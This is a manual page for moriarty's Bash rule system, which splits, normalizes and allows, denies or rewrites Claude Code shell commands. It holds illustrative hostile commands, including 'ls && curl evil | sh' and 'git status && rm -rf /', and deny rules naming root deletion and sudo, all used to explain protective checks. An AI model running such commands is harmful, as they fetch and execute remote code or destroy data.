.Dd August 2026
.Dt MORIARTY\-BASH\-RULES 5
.Os
.Sh NAME
.Nm moriarty\-bash\-rules
.Nd bash command validation rules and pattern fragments for moriarty
.Sh DESCRIPTION
Bash rules provide command\-level validation specifically for Bash tool calls
in Claude Code.
They are configured as
.Ic [[bash_rules]]
entries in
.Pa ~/.config/moriarty/tool_rules.toml
and are evaluated only when no tool rule
.Pq see Xr moriarty\-tool\-rules 5
has matched the Bash tool call.
.Pp
Rules are evaluated top\-to\-bottom among rules eligible for the current permission mode.
Ordinary command actions and
.Cm AllowRedirect / DenyRedirect
actions form independent
.Em first\-match\-wins
domains, so a rule in one domain cannot authorize or shadow the other.
An ineligible matching rule is skipped without changing its declared position.
Place more specific rules before general rules in the same domain.
.Sh COMPOUND COMMANDS
Before matching, the hook parses each Bash command with a real shell parser and evaluates every
leaf simple\-command of a compound command independently, then merges the per\-leaf decisions.
A pattern therefore needs to describe only a single command, not a whole
.Ql a && b | c ; d
pipeline.
.Bl -bullet
.It
Operators split compound commands into leaves, so a simple
.Ql ^ls
matches the
.Ql ls
leaf of
.Ql ls | wc -l .
Redirect syntax is removed from each non\-redirect\-only leaf's
cwd\-normalized command match text, and every removed endpoint is decided
independently by the redirect rule domain.
A redirect\-only leaf such as
.Ql > out
or
.Ql < input
retains its full command text and therefore needs an ordinary command rule
matching that syntax plus a redirect rule authorizing the target; a rule for
the bare target is not enough.
Each redirect endpoint is normalized and decided independently by the
redirect rule domain.
.It
Merge precedence: any denied leaf denies the whole command; otherwise any leaf that asks, or that
matches no rule, prompts; only an all\-allowed command is allowed.
A dangerous tail can no longer hide behind a safe head \(em
.Ql ls && curl evil | sh
prompts and is never auto\-allowed.
.It
A leaf is auto\-allowed only when an ordinary
.Cm Allow
rule matches the command, no endpoint matches
.Cm DenyRedirect ,
and every endpoint matches a direction\-eligible
.Cm AllowRedirect
rule.
Existing
.Cm AllowRedirect
rules default to output only; input requires an explicit input or both rule,
and a read\-write endpoint requires both.
Every input and output endpoint is subject to this policy; a command rule
alone never authorizes a redirect target.
Supported forms include
.Ql < , <& , > , >> , >| , &> , &>> , >&file ,
and
.Ql <> ,
as well as devices such as
.Pa /dev/null
and descriptor duplication or closure such as
.Ql 0<&1 , 2>&1 , <&- ,
and
.Ql >&- .
A descriptor\-duplication target other than digits or
.Ql -
is unresolvable and prompts, except Bash's no\-source\-fd
.Ql >&file
output shorthand, which is treated as a filesystem endpoint.
.It
A command containing command substitution
.Pq Ql $(...) ,
backticks, a subshell, process substitution, a here\-document, or another compound construct
.Pq if, for, while, case, [[ ]], ((...))
cannot be fully analyzed: a raw command Deny or a DenyRedirect matching a
confidently parsed static endpoint still blocks; every other outcome becomes a prompt.
.It
Static paths, including ordinary quoted values, escaped literals, and glob
patterns with no dot\-prefixed component, are normalized when their in\-cwd
relative remainder contains no
.Ql ..
component.
Thus
.Ql ^cat src/
matches both
.Ql cat \(dq/abs/cwd/src/x\(dq
and
.Ql cat /abs/cwd/src/*.rs .
Parent\-containing paths, unquoted brace syntax, and glob paths with
dot\-prefixed components remain unchanged; quoted or escaped braces are
literal and do not block normalization.
An operand equal to the cwd becomes
.Ql .
rather than disappearing.
.El
.Ss Redirect Endpoint Authorization
Filesystem endpoints are canonicalized before redirect rules match.
Existing symlinks are resolved; for a missing target, the deepest existing directory is
canonicalized and the missing suffix is rebuilt without permitting
.Ql ..
to escape that ancestor.
Broken symlinks, non\-directory ancestors, races that prevent stable resolution, dynamic variables,
globs (including extglobs such as
.Ql @(one|two) ) ,
braces, and other non\-static targets prompt rather than auto\-allow.
Unsafe virtual paths under
.Pa /proc/self , /proc/thread-self , /dev/fd , /dev/std* , /dev/tcp ,
or
.Pa /dev/udp ,
including targets reached through symlink chains, also prompt because the hook cannot resolve them as the later Bash process or safely model Bash network redirects.
Filesystem checks reduce but cannot eliminate the time\-of\-check/time\-of\-use race between
hook evaluation and shell execution.
Live Bash evaluation runs under one two\-second deadline covering parsing, matching, path resolution,
Modify checks, and ArgumentFilter rechecks.
A timeout or blocking\-task failure prompts without a deciding rule or contributors.
Offline test, replay, explain, and suggestion evaluation has no deadline.
.Pp
The redirect pattern sees a deterministic endpoint: a path below canonical cwd is cwd\-relative
.Pq Ql . No for cwd itself ,
a path below the resolved home is
.Ql ~/... ,
and another path remains canonical absolute.
Devices and special files always use canonical absolute form, so
.Ql /dev/null
is independent of cwd.
A cwd\-relative filename beginning with
.Ql ~
or
.Ql &
receives a
.Ql ./
prefix; the ordinary file
.Ql ./&1
therefore cannot collide with the descriptor token
.Ql &1 .
A resolved path that is not valid UTF\-8 prompts rather than being rendered lossily.
Descriptor duplication and closure use tokens such as
.Ql &1 , &2 ,
and
.Ql &- .
Only an unquoted plain current-user
.Ql ~
is expanded through home.
A quoted or escaped tilde remains a cwd-relative literal and is rendered as
.Ql ./~/... ,
so it cannot collide with the home-relative form.
An invalid or unavailable
.Ev HOME
prevents plain tilde expansion but does not block unrelated local, absolute, device, or descriptor targets.
An ordinary
.Ql $HOME
is dynamic.
.Cm HOME
cannot be configured as a path alias because it controls tilde expansion.
A relative or home-relative filesystem redirect in a path-context barrier command, or any later command, prompts because
changed shell path context is not modeled.
Assignments, dynamic command names,
.Cm cd , pushd , popd ,
recognized shell-state builtins, including
.Cm shopt , alias , unalias ,
and non-isolated compound constructs such as brace groups and
.Cm if , for , while , case
clauses are barriers; absolute paths and descriptor redirects remain independently evaluable.
For the same reason,
.Ql moriarty rules suggest --action allow-redirect
omits any leaf containing a context-dependent endpoint and any leaf blocked by command policy.
Leaves whose endpoints are all absolute or descriptors remain eligible.
Local suggestions match cwd-relative names in every project; they are not scoped to the repository where they were mined.
Historical logs do not record HOME, so replay and suggestion mining resolve tilde targets against the current process
HOME and live filesystem.
A rule with
.Ic allow_local = true
matches only ordinary or not\-yet\-created filesystem targets resolved below canonical cwd.
It cannot authorize devices, special files, or descriptor tokens; those require an unrestricted,
target\-specific
.Cm AllowRedirect
rule.
.Pp
All endpoints must match independently and in source order.
A missing match caps an otherwise allowed command at Ask.
.Cm Modify
output and
.Cm ArgumentFilter
revalidation are subject to the same endpoint policy.
.Pp
Allow\-rules can therefore be simple prefixes without enumerating pipes, operators, or
shell\-metacharacter exclusions.
A pattern still needs to guard a program's
.Em own
ability to run code or write files
.Pq for example Ql find -exec , sed -i, or xargs ,
which are not shell\-level and so are invisible to the splitter.
Use
.Ql moriarty test bash-rules --mode plan --explain
to simulate a mode and see how a command splits and which rule matches each leaf, and
.Ql moriarty rules lint
to find rules the hook silently ignores.
.Sh PATH ALIAS ANALYSIS
Claude Code sometimes assigns a long workspace path to a shell variable and
reuses it in later leaf commands.
Selected variables can participate in conservative static expansion through
the top\-level option:
.Bd -literal -offset indent
bash_path_aliases = ["P"]
.Ed
.Pp
For example:
.Bd -literal -offset indent
P=/work/project/node_modules/pkg; rg needle $P/output.d.ts | head \-5
.Ed
.Pp
With
.Ql cwd=/work/project ,
the
.Ql rg
leaf is matched as
.Ql rg needle node_modules/pkg/output.d.ts .
This is exactly the treatment of the equivalent literal path.
The declaration grants no permission: every analyzed leaf must still match
the ordered rules, out\-of\-cwd paths remain absolute, and paths containing
.Ql ..
are not presented as safe relative paths.
.Ss Trusted Policy
Names must match
.Ql [A\-Za\-z_][A\-Za\-z0\-9_]* .
Duplicates are removed and names are stored in canonical order.
The following shell\-control names are rejected when the configuration is
loaded:
.Cm PATH , IFS , CDPATH , GLOBIGNORE , BASH_ENV , ENV ,
.Cm SHELLOPTS , BASHOPTS , FPATH , PS4 ,
and
.Cm PROMPT_COMMAND .
.Pp
.Sy Security Warning :
This option is trusted policy, not a generic assignment allowance.
Do not configure variables that change application or tool behavior,
including compiler flags, package\-manager settings, credentials, or
configuration selectors.
.Nm
cannot know every program's environment\-variable semantics.
.Ss Supported Form
A binding is recognized only as a leading, synchronous, assignment\-only
simple command terminated by a semicolon or newline.
It must contain one scalar, non\-append assignment and no command, redirect,
pipeline peer,
.Ql ! ,
.Ql time ,
boolean operator, or background separator.
The unquoted value must match exactly:
.Pp
.Dl ^/[A\-Za\-z0\-9/._@+,:=%\-]*$
.Pp
Later words may use one plain
.Ql $NAME
or
.Ql ${NAME}
with literal prefix or suffix text, either unquoted or inside ordinary
double quotes.
Examples include
.Ql $P/output.d.ts ,
.Ql --file=$P/input ,
.Li \(dq$P/runtime/mocks.js\(dq ,
and
.Li \(dq$P\(dq/runtime/mocks.js .
Expansion uses parser nodes, not textual replacement:
single\-quoted references stay literal and similarly prefixed names do not
match.
Locale\-translated double\-quoted, indirect, length, default\-value,
transform, multiple\-expansion, array, append, temporary environment,
conditional, and pipeline or background declaration forms are unsupported.
Paths containing
.Ql ..
may be expanded, but are not presented as safe relative paths and remain
unchanged during cwd normalization; relative alias declarations remain
unsupported.
Other quoting or escaping in an alias\-expanded word is likewise unsupported
and caps an otherwise allowed leaf at Ask.
.Pp
A consumed declaration is analysis metadata rather than an executable leaf.
An unused declaration, unsupported configured\-alias form, unresolved
reference, or expansion in command position is still matched normally, but
any Allow is capped at Ask.
A Deny remains effective, including a Deny on a later dangerous leaf.
Command substitution, backticks, arithmetic or process substitution, here
documents, and uninspectable shell compounds remain fail\-safe and cannot be
enabled by AllowRedirect; a matching DenyRedirect still blocks a confidently
parsed static endpoint.
.Ss Mutation Barriers
Moriarty deliberately does not model individual Bash mutation targets.
An assignment invalidates all aliases only when a binding is active or the
assignment targets a configured alias.
Unrelated standalone environment assignments remain eligible for normal
rules.
A dynamic command name invalidates all active aliases and requires
confirmation.
The same conservative barrier applies to
.Cm command , builtin , exec , eval , source , . , trap , let , unset ,
.Cm export , readonly , declare , typeset , local , read , mapfile ,
.Cm readarray , getopts , printf , shopt , alias ,
and
.Cm unalias .
This may prompt for a harmless form, but later references cannot use stale
bindings and no per\-builtin option semantics are required.
.Pp
Redirect targets are classified after known expansion.
Every redirect endpoint still requires separate direction\-matching policy;
expanded
.Pa /dev/null
and descriptor endpoints have no exemption.
An expansion in command position requires confirmation, while
.Cm exec
and wrapper barriers prevent an alias from auto\-authorizing a derived
executable.
.Pp
.Cm moriarty test bash\-rules Fl \-cwd Ar dir Fl \-explain Ar command
shows consumed bindings, original source, alias\-expanded text,
redirect\-free cwd\-normalized command text, endpoint direction, match text,
locality, the allowing or denying redirect rule,
resolution or authorization failures,
unanalyzable Modify rewrites, ordered contributors, and the final decision.
JSON endpoint traces encode matched redirect policy as an
.Ic allowed
or
.Ic denied
decision; failure text is reserved for resolution failures and endpoints with no eligible allow rule.
Normal test execution, explain mode, and replay use the same completed analysis and one\-pass
.Cm ArgumentFilter
revalidation as the live hook.
Suggestions consume the same canonical original policy analysis without computing unused continuations.
.Sh CONFIGURATION
.Ss File Location
.Pa ~/.config/moriarty/tool_rules.toml
.Pp
The path respects
.Ev XDG_CONFIG_HOME
if set.
.Ss Rule Structure
.Bd -literal -offset indent
[[bash_rules]]
name = "descriptive\-name"
pattern = "regex\-pattern"
modes = ["default", "plan"] # optional
action = { type = "ActionType", ... }
.Ed
.Ss Fields
.Bl -tag -width Ds
.It Ic name
A descriptive name for the rule, used in log output.
.It Ic pattern
A regular expression
.Pq Rust regex syntax
to match against the bash command.
Pattern fragments may be used with
.Ql {{fragment_name}}
syntax; see
.Sx PATTERN FRAGMENTS .
.It Ic modes
Optional permission\-mode allow\-list.
Accepted values are exactly
.Cm default ,
.Cm plan ,
.Cm acceptEdits ,
.Cm auto ,
.Cm dontAsk ,
and
.Cm bypassPermissions .
The UI's Manual mode arrives as
.Cm default ;
.Cm manual
is invalid.
Omitting the field permanently defines an unrestricted rule enabled in every mode;
this is a fully supported configuration, not a deprecated compatibility form.
An empty array disables the rule.
Current hook events require a permission mode.
A restricted rule is ineligible during a mode\-less historical replay or test evaluation.
The same mode is used for every compound leaf, whole\-command bail evaluation, and ArgumentFilter revalidation.
.It Ic action
The action to take when the pattern matches.
See
.Sx ACTIONS .
.El
.Sh ACTIONS
.Ss Allow
Explicitly allow the command to execute without user confirmation.
.Bd -literal -offset indent
[[bash_rules]]
name = "allow\-git\-status"
pattern = "^git\e\es+status"
action = { type = "Allow" }
.Ed
.Ss AllowRedirect and DenyRedirect
Redirect rules match a normalized endpoint without granting command execution
and are evaluated only in the separate endpoint domain.
.Cm AllowRedirect
defaults to
.Cm direction = "output" ;
use
.Cm "input"
for read endpoints or
.Cm "both"
for either direction and for read\-write endpoints.
.Cm DenyRedirect
defaults to both directions.
Place specific denies before broad allows because the domain is first\-match\-wins.
.Bd -literal -offset indent
[[bash_rules]]
name = "deny\-secret\-input"
pattern = "^secrets/"
action = { type = "DenyRedirect", value = "Secret input blocked",
           direction = "input" }

[[bash_rules]]
name = "allow\-project\-build\-redirects"
pattern = "^build/"
action = { type = "AllowRedirect", allow_local = true }

[[bash_rules]]
name = "allow\-fixture\-input"
pattern = "^fixtures/"
action = { type = "AllowRedirect", allow_local = true,
           direction = "input" }
.Ed
.Pp
For
.Cm AllowRedirect
rules, omitting
.Ic allow_local
is equivalent to false and permits the pattern to match non\-local filesystem paths, devices, and
descriptor tokens.
Such rules should use narrowly anchored patterns.
.Ss Deny
Block the command and show an error message to the user.
.Bd -literal -offset indent
[[bash_rules]]
name = "deny\-rm\-rf"
pattern = "^rm\e\es+\-rf\e\es+/"
action = { type = "Deny", value = "Recursive delete of root is not allowed" }
.Ed
.Ss Modify
Transform the command before execution using regex capture groups
.Pq $0, $1, $2, etc. .
.Bd -literal -offset indent
[[bash_rules]]
name = "add\-dry\-run"
pattern = "^(docker\e\es+system\e\es+prune)"
action = { type = "Modify", value = "$1 \-\-dry\-run" }
.Ed
.Pp
Moriarty appends the original leaf's redirects to the capture\-expanded
replacement in source order, preserving their operators and target spelling.
Path\-alias declarations referenced by those redirects remain in the modified command.
For an analyzable rewrite, the modification is returned only when parsing confirms
that the appended redirects remain attached to the same replacement leaf; a trailing
separator or comment that would detach or swallow them prompts instead.
Unanalyzable rewrites follow the fail\-closed check below.
Every endpoint is then checked.
A rewritten command the splitter cannot analyze prompts when no redirect is
apparent because Moriarty cannot prove that the rewrite opens no endpoint;
a matching redirect deny still blocks a confidently parsed static endpoint.
Alias or shell-state uncertainty in a rewritten leaf has the same fail-closed result.
.Pp
.Sy Security Warning :
Modify actions use unescaped capture group replacement.
Avoid patterns like
.Ql ^docker (.*)
that capture arbitrary input.
Use specific patterns like
.Ql ^(docker\e\es+system\e\es+prune)$
instead.
.Ss Ask
Defer to the user for case\-by\-case authorization.
Claude Code will prompt the user to approve or deny.
.Bd -literal -offset indent
[[bash_rules]]
name = "ask\-for\-sudo"
pattern = "^sudo\e\eb"
action = { type = "Ask" }
.Ed
.Ss ArgumentFilter
Structurally remove, add, or replace command arguments before execution.
Unlike
.Cm Modify ,
.Cm ArgumentFilter
uses normalized brush argument values and alias\-expanded source spans,
making it easier to handle flags regardless of their position without
activating unchanged quoted or escaped syntax.
Unchanged quoting, expansions, redirect operators, leading
.Cm time , time -p ,
and
.Cm !
pipeline prefixes, and a trailing background
.Cm &
remain intact; replacement and added values are shell-quoted.
Redirect endpoint policy therefore still applies after filtering.
.Pp
.Sy Important :
After filtering, the modified command is automatically re\-validated
against all rules.
The filtered command must match an ordinary
.Cm Allow
rule, no endpoint may match
.Cm DenyRedirect ,
and every redirect endpoint must match a direction\-eligible
.Cm AllowRedirect
.Pq or the command is manually approved via Cm Ask .
Chained ArgumentFilter rules are prevented to avoid infinite loops.
.Pp
.Em Removing arguments :
.Bd -literal -offset indent
[[bash_rules]]
name = "cargo\-doc\-no\-browser"
pattern = "^cargo doc.*\-\-open"
action = { type = "ArgumentFilter", remove = ["\-\-open", "\-o"],
           reason = "Browser flags removed" }
.Ed
.Pp
The
.Ic remove
field supports exact matches
.Pq Ql \-\-open
and prefix matches
.Pq Ql \-\-open No also removes Ql \-\-open=browser .
Arguments are removed regardless of position.
.Pp
.Em Adding arguments :
.Bd -literal -offset indent
[[bash_rules]]
name = "docker\-run\-safety"
pattern = "^docker run(?!.* \-\-read\-only)"
action = { type = "ArgumentFilter",
           add = ["\-\-read\-only", "\-\-security\-opt=no\-new\-privileges"],
           reason = "Added security restrictions" }
.Ed
.Pp
Arguments are appended to the end of the command.
.Pp
.Em Replacing arguments .
The
.Ic replace
field is a table mapping an exact argument token to its replacement:
.Bd -literal -offset indent
[[bash_rules]]
name = "rm\-force\-interactive"
pattern = "^rm .*\-f"
action = { type = "ArgumentFilter",
           replace = { "\-f" = "\-i" },
           reason = "Replaced force with interactive" }
.Ed
.Pp
.Ic replace
matches whole tokens exactly (not prefixes).
To drop several variants of a flag and substitute one safe form, combine
.Ic remove
and
.Ic add
instead
.Pq Ic remove No additionally matches prefixes such as Ql \-\-flag=value :
.Bd -literal -offset indent
[[bash_rules]]
name = "rm\-force\-interactive\-variants"
pattern = "^rm .*\-f"
action = { type = "ArgumentFilter",
           remove = ["\-f", "\-\-force"],
           add = ["\-i"],
           reason = "Replaced force with interactive" }
.Ed
.Pp
.Em Operation order :
.Bl -enum -offset indent -compact
.It
Remove specified arguments.
.It
Replace specified arguments (if the
.Ic replace
field is used).
.It
Add new arguments.
.El
.Sh PATTERN FRAGMENTS
Pattern fragments allow defining reusable regex snippets referenced in
rule patterns using
.Ql {{fragment_name}}
syntax.
.Ss Defining Fragments
.Bd -literal -offset indent
[pattern_fragments]
safe_chars = "[^|&;$\`()<>{}]"

[[bash_rules]]
name = "allow\-ls"
pattern = "^ls{{safe_chars}}*$"
action = { type = "Allow" }
.Ed
.Ss Nested Fragments
Fragments can reference other fragments.
Expansion happens depth\-first, fully resolving each reference before moving to the next:
.Bd -literal -offset indent
[pattern_fragments]
safe_chars = "[^|&;$\`()<>{}]"
safe_arg = "( {{safe_chars}}+)"
safe_pipe = "( \e\e| (head|tail|grep){{safe_arg}}*)"
.Ed
.Ss Built\-in Default Fragments
.Nm moriarty
provides the following default fragments:
.Bl -tag -width "safe_pipe_cmd" -compact
.It Ic safe_chars
.Ql [^|&;$\`()<>{}]
\(em characters that don't allow shell injection.
.It Ic identifier
.Ql [a\-zA\-Z_][a\-zA\-Z0\-9_\-]*
\(em valid identifier pattern.
.It Ic number
.Ql [0\-9]+
\(em numeric values.
.It Ic safe_arg
.Ql "( [^|&;$\`()<>{}]+)"
\(em safe command argument.
.It Ic safe_flag
.Ql "( \-[a\-zA\-Z_][a\-zA\-Z0\-9_\-]*)"
\(em safe command flag.
.It Ic safe_path
.Ql "( [^|&;$\`()<>{}]+/[^|&;$\`()<>{}]*)"
\(em a safe file path (no shell metacharacters).
.It Ic safe_pipe_cmd
.Ql (head|tail|grep|wc|sort|uniq)
\(em safe pipe target commands.
.It Ic safe_pipe
.Ql "( \e| (head|tail|grep|wc|sort|uniq)( [^|&;$\`()<>{}]+)*)"
\(em safe command piping using
.Ic safe_pipe_cmd .
.El
.Pp
User\-defined fragments with the same name override the defaults.
.Ss Fragment Naming Rules
Fragment names must start with a letter or underscore
.Pq Ql [a\-zA\-Z_]
and may contain letters, numbers, underscores, and hyphens
.Pq Ql [a\-zA\-Z0\-9_\-]* .
.Ss Expansion Limits
Nesting is limited to 10 levels, and a single pattern may perform at most
256 fragment substitutions in total.
The second limit exists because a fragment referencing several others
multiplies at every level, so a shallow set of fragments can still expand
into an enormous regex.
Neither limit is reachable by hand\-written fragments.
.Ss Circular Dependencies
Fragments cannot reference each other in a cycle.
The system detects circular dependencies and reports an error
when loading the configuration.
.Pp
Referencing the same fragment from several places is not a cycle.
A pattern may use both
.Ql {{safe_arg}}
and
.Ql {{safe_chars}}
even though
.Ic safe_arg
itself expands
.Ql {{safe_chars}} ;
that is a directed acyclic graph and expands without error.
Only a fragment that reaches itself, directly or transitively, is rejected.
.Sh SECURITY BEST PRACTICES
.Bl -enum
.It
.Em Shell\-metacharacter exclusions are usually unnecessary now.
Because the engine splits operators off each leaf and bails on command/process substitution, an
allow\-rule no longer needs character classes such as
.Ql [^|&;$\`()<>{}]
to stay safe; a simple prefix like
.Ql ^ls
suffices.
A raw command deny or a redirect deny matching a confidently parsed static
endpoint still blocks a bailed command; every other bailout outcome prompts.
See
.Sx COMPOUND COMMANDS .
.It
.Em Anchor at the start of a leaf.
Anchor allow\-rules with
.Ql ^
so they match from the start of a command rather than mid\-string.
A trailing
.Ql $
is no longer needed to stop a dangerous tail \(em
.Ql git status && rm \-rf /
is split, and the
.Ql rm
leaf is judged on its own \(em so use
.Ql $
only when you intend to match a whole leaf exactly.
.It
.Em Guard a program's own dangerous arguments.
The splitter cannot see flags that make a program run code or write files.
Keep restrictive patterns for those
.Pq for example prompt on Ql find -exec No or Ql sed -i .
.It
.Em Escape regex metacharacters.
Remember to escape
.Ql \e\e , ( , ) , [ , ] , { , } , \&. , * , + , ? , |
in patterns.
.It
.Em Order rules from specific to general within each domain.
Deny rules for dangerous commands should come before broader command allow rules.
Keep unrestricted redirect patterns target\-specific; use
.Ic allow_local = true
for intentional project\-wide redirect policy.
.It
.Em Use fragments for security patterns.
Define injection\-safe character classes once and reuse them.
.El
.Sh EXAMPLES
.Ss Safe Cargo Commands
.Bd -literal -offset indent
[pattern_fragments]
safe_chars = "[^|&;$\`()<>{}]"

[[bash_rules]]
name = "cargo\-doc\-no\-browser"
pattern = "^cargo doc.*\-\-open"
action = { type = "ArgumentFilter", remove = ["\-\-open", "\-o"],
           reason = "Browser not useful for Claude" }

[[bash_rules]]
name = "cargo\-safe\-commands"
pattern = "^cargo (build|check|test|clippy|fmt|doc)( {{safe_chars}}+)*$"
action = { type = "Allow" }
.Ed
.Ss Git Operations
.Bd -literal -offset indent
[[bash_rules]]
name = "allow\-git\-read"
pattern = "^git (status|diff|log|show)"
action = { type = "Allow" }

[[bash_rules]]
name = "ask\-git\-write"
pattern = "^git (commit|push|pull|rebase)"
action = { type = "Ask" }

[[bash_rules]]
name = "deny\-git\-force"
pattern = "^git\e\es+push.*\-\-force"
action = { type = "Deny", value = "Force push is not allowed" }
.Ed
.Ss Comprehensive Security
.Bd -literal -offset indent
[pattern_fragments]
safe = "[^|&;$\`()<>{}]"
safe_arg = "( {{safe}}+)"

[[bash_rules]]
name = "deny\-rm\-rf\-root"
pattern = "^rm\e\es+\-rf\e\es+/"
action = { type = "Deny", value = "Cannot delete from root" }

[[bash_rules]]
name = "deny\-sudo"
pattern = "^sudo\e\eb"
action = { type = "Deny", value = "sudo not allowed" }

[[bash_rules]]
name = "allow\-read\-commands"
pattern = "^(ls|cat|head|tail|grep|wc|find){{safe_arg}}*$"
action = { type = "Allow" }

[[bash_rules]]
name = "allow\-cargo"
pattern = "^cargo (build|check|test|clippy|fmt){{safe_arg}}*$"
action = { type = "Allow" }
.Ed
.Sh TROUBLESHOOTING
.Bl -tag -width Ds
.It Em Rule not matching
Check both the regex and the rule's
.Ic modes ;
a restricted rule is skipped when the current mode is absent or unlisted.
Reproduce the hook with
.Cm moriarty test bash\-rules \-\-mode Ar mode \-\-explain Ar command .
Check logs at
.Pa ~/.local/state/moriarty/hooks/
to see the recorded mode and which rule matched:
.Pp
.Dl tail \-f ~/.local/state/moriarty/hooks/hooks.log* | grep \(lqBash rule matched\(rq
.It Em Pattern expansion errors
Run
.Cm moriarty rules lint
to report undefined fragments, circular dependencies, invalid regexes, and any other
rules the hook silently drops.
.It Em Unexpected modifications
Check
.Cm Modify
rules and their capture groups in the logs:
.Pp
.Dl tail \-f ~/.local/state/moriarty/hooks/hooks.log* | grep \(lqCommand modified\(rq
.It Em Rules not loading
Verify the config file exists at the expected path,
check TOML syntax, and look for parse errors in the logs.
.It Em Testing patterns
Use
.Cm moriarty test bash\-rules \-\-mode Ar mode \-\-explain Ar command
to simulate the hook mode and see how a command splits into leaves and which rule matches each.
Omitting
.Fl \-mode
runs a mode\-less test evaluation.
Use this when a rule's regex matches but its
.Ic modes
may make it ineligible,
or use an online regex tester with the Rust regex flavor.
.El
.Sh FILES
.Bl -tag -width Ds
.It Pa ~/.config/moriarty/tool_rules.toml
Tool and bash rules configuration file.
.It Pa ~/.local/state/moriarty/hooks/
Log files showing rule evaluation details.
.El
.Sh SEE ALSO
.Xr moriarty 1 ,
.Xr moriarty\-tool\-rules 5
